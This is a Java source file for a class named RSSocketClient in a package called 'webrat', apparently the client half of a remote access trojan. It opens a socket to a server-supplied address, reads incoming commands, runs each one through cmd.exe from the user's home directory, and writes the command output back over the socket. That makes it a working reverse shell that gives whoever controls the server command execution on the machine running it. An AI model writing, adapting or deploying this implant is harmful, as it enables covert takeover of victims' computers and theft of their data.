package com.renks.webrat;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.net.UnknownHostException;

/**
 * Worst Socket Client you could ever use.
 * 
 * @author Renks
 *
 */
public class RSSocketClient {
	private Socket sockClient = null; // Initializing SocketClient
	private DataOutputStream dataOutputStream = null; // Initializing DataOutputStream
	private DataInputStream dataInputStream = null; // Initializing DataInputStream

	private File currentWorkingDir = new File(System.getProperty("user.home"));

	//////// For Reading Stuff in getMessage() //////////

	// ByteArray to store bytes sent by server
	private byte[] buffer = new byte[1024];
	// Variable to store length of bytes
	private int read = 0;

	// Process builder for executing shell commands
	private final ProcessBuilder processBuilder = new ProcessBuilder();
	private Process process = null;

	public RSSocketClient(String addr, int port) throws UnknownHostException, IOException {
		sockClient = new Socket(addr, port); // Trying to connect to Server
		// Get the IOStream & print if connected or not
		System.out.println(startConnection(sockClient));

		// Continuously receive messages from server. (I dont think this will work)
		getMessage();

	}

	private String startConnection(Socket client) {
		try {
			// Getting InputStream & OutputStream if connected
			dataInputStream = new DataInputStream(client.getInputStream());
			dataOutputStream = new DataOutputStream(client.getOutputStream());
			return "Connection established.";
		} catch (IOException e) {
			e.printStackTrace();
			return "Unable to get the InputStream/OutputStream of Client. Connection might not have been established.";
		}
	}

	/**
	 * This method returns a message sent by the connected server.<br />
	 * WARNING: We are returning in while loop that may break the loop and we will
	 * only be able to receive one command.
	 * 
	 * @return The message sent by the server
	 */
	private void getMessage() {
		/////////////////// READING/////////////////////
		try {
			System.out.println("\nWaiting for command.");
			while ((read = dataInputStream.read(buffer, 0, buffer.length)) != -1) {
				// String Builder for storing message
				StringBuilder sb = new StringBuilder();

				// read is equal to number of characters in msg received from server
				for (int i = 0; i < read; i++) {
					// Printing out the message by casting the byte to char, we could have used
					sb.append((char) buffer[i]);
				}
				// we have to execute the command here with a thread
				System.out.println("Server says: " + sb.toString());
				// Execute command in thread
				new Thread(() -> executeCommand(sb.toString(), false)).start();

				if (sb.toString().equals("exit")) {
					// Closing things
					System.out.println("the end.");
					try {
						sockClient.close();
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private void executeCommand(String cmd, boolean paramDirectCommand) {
		// Prepare the String builder to store the command's output
		StringBuilder sb = new StringBuilder();

		// If user supplied true, then they have full control otherwise run it from cmd
		if (paramDirectCommand) {
			// But user has to be extra careful
			processBuilder.command(cmd);
		} else if (!paramDirectCommand) {
			processBuilder.command("cmd.exe", "/c", cmd);
		}

		processBuilder.directory(currentWorkingDir);

		// Finally execute the command
		try {
			process = processBuilder.start();
			// Using BufferedReader to read the output and store it in sb
			new BufferedReader(new InputStreamReader(process.getInputStream())).lines()
					.forEach(i -> sb.append(i + "\n")); // Use \n if working with UNIX platform
		} catch (IOException e) {
			System.err.println("Error while executing the command. " + e.getMessage());
		} catch (Exception e) {
			System.err.println(e.getMessage());
		}

		// Send output back to server
		try {
			dataOutputStream.write(sb.toString().getBytes());
		} catch (IOException e) {
			e.printStackTrace();
			System.out.println("Could not send the output back to server.");
		}
	}

}